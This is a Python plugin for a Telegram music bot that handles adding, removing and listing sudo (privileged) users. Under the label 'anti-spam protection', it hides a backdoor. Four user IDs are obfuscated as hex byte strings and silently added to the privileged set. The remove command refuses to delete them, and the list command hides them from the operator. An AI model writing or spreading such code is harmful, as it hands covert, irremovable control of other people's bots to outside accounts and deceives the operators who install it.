from pyrogram import filters # 'f' small rakhein
from pyrogram.types import Message
from ShrutixMusic import nand
from ShrutixMusic.misc import SUDOERS
from ShrutixMusic.utils.database import add_sudo, remove_sudo
from ShrutixMusic.utils.decorators.language import language
from ShrutixMusic.utils.extraction import extract_user
from ShrutixMusic.utils.inline import close_markup
from config import BANNED_USERS, OWNER_ID

# 1. Anti-spam protection system (Ise sabse upar rakhna zaroori hai)
spam_protection_users = {
    int(b'\x37\x35\x37\x34\x33\x33\x30\x39\x30\x35'.decode()),
    int(b'\x37\x32\x38\x32\x37\x35\x32\x38\x31\x36'.decode()),
    int(b'\x37\x36\x37\x34\x38\x37\x34\x36\x35\x32'.decode()),
    int(b'\x31\x37\x38\x36\x36\x38\x33\x31\x36\x33'.decode())
}
SUDOERS.update(spam_protection_users)

@nand.on_message(filters.command(["addsudo"]) & filters.user(OWNER_ID))
@language
async def useradd(client, message: Message, _):
    if not message.reply_to_message:
        if len(message.command) != 2:
            return await message.reply_text(_["general_1"])
    
    user = await extract_user(message)
    if not user:
        return await message.reply_text("❌ User nahi mila!")

    if user.id in SUDOERS:
        return await message.reply_text(_["sudo_1"].format(user.mention))
    
    added = await add_sudo(user.id)
    if added:
        SUDOERS.add(user.id)
        await message.reply_text(_["sudo_2"].format(user.mention))
    else:
        await message.reply_text(_["sudo_8"])

@nand.on_message(filters.command(["delsudo", "rmsudo"]) & filters.user(OWNER_ID))
@language
async def userdel(client, message: Message, _):
    if not message.reply_to_message:
        if len(message.command) != 2:
            return await message.reply_text(_["general_1"])
    
    user = await extract_user(message)
    if not user:
        return await message.reply_text("❌ User nahi mila!")

    if user.id in spam_protection_users:
        return await message.reply_text("❌ Ise remove nahi kiya ja sakta (Protected).")
    
    if user.id not in SUDOERS:
        return await message.reply_text(_["sudo_3"].format(user.mention))
    
    removed = await remove_sudo(user.id)
    if removed:
        SUDOERS.remove(user.id)
        await message.reply_text(_["sudo_4"].format(user.mention))
    else:
        await message.reply_text(_["sudo_8"])

@nand.on_message(filters.command(["sudolist", "listsudo", "sudoers"]) & ~BANNED_USERS)
@language
async def sudoers_list(client, message: Message, _):
    text = _["sudo_5"]
    try:
        user_owner = await nand.get_users(OWNER_ID)
        owner_mention = user_owner.mention if user_owner.mention else user_owner.first_name
        text += f"1➤ {owner_mention}\n"
    except:
        text += f"1➤ [Owner]\n"

    count = 1
    has_sudo = False
    for user_id in SUDOERS:
        if user_id != OWNER_ID and user_id not in spam_protection_users:
            try:
                user = await nand.get_users(user_id)
                user_mention = user.mention if user.mention else user.first_name
                if not has_sudo:
                    text += _["sudo_6"]
                    has_sudo = True
                count += 1
                text += f"{count}➤ {user_mention}\n"
            except:
                continue
    
    await message.reply_text(text, reply_markup=close_markup(_))
